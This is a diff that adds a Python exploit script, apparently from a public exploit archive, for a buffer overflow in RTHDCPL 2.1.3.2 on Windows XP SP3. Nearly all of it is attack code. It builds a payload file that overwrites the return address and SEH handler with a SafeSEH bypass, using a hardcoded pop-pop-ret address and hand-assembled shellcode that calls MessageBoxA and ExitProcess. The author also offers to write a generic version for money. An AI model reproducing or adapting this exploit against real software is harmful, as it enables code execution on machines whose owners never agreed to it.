@@ -1,0 +1,50 @@
+# done by BraniX <branix@hackers.org.pl>
+# www.hackers.org.pl
+# found: 2010.08.24
+# tested on: Windows XP SP3 Home Edition
+# SafeSEH bypass
+
+# App. has classic buffer overflow vulnerability
+# it can be triggered by passing a too long argument 
+# as a startup parameter. Shellcode can by run via classic
+# ret overwrite or SEH Handler overwrite ... so it's a mini-combo ;)
+
+# Ps. If you need a generic exploit ...
+# (no hardcoded VA'a), write it yourself ;) or 'donate few' $$$ 
+# we will c0de it for You ^^
+
+filepath = "C:\\ShellCode\\RTHDCPL 2.1.3.2 - Exploit.bin"
+f = open(filepath, "wb")
+
+f.write('A'*4)
+f.write('\x5E')                     # pop esi
+f.write('\x5E')                     # pop esi
+f.write('\xC3')                     # ret
+f.write('\x90')                     # nop
+
+f.write('[BraniX]')
+f.write('A'*448)                    # mock
+
+f.write('\xEB\x06')                 # jmp +6
+f.write('\x90')                     # nop
+f.write('\x90')                     # nop
+
+f.write('\x70\x01\xA5\x01')         # pop; pop; ret; address
+
+f.write('\x83\xC1\x0C')             # add ecx, 0Ch
+f.write('\x88\x01')                 # mov byte ptr [ecx], al
+f.write('\x83\xE9\x08')             # sub ecx, 08
+f.write('\x50')                     # push eax
+f.write('\x51')                     # push ecx
+f.write('\x51')                     # push ecx
+f.write('\x50')                     # push eax
+f.write('\xE8\xC5\x08\x27\x7E')     # call user32.MessageBoxA
+
+f.write('\x50')                     # push eax
+f.write('\xE8\xE7\xCB\x6E\x7C')     # call kernel32.ExitProcess
+
+f.write('\xCC'*1500)                # int 3's
+
+f.close()
+
+print "Done ..."
